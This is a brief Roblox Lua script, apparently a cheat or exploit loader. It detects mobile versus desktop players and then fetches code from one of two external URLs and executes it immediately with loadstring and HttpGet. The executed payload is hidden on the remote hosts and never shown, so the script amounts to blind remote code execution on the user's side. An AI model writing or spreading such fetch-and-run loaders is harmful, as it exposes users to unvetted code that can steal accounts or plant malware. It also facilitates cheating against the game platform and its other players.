local UIS = game:GetService("UserInputService")
local mobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

if mobile then
    loadstring(game:HttpGet("https://loader.xzuyaxhub.workers.dev/?repo=BLR"))()
else
    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/547d26fa04ec73ade5774968a32721cb"))()
end
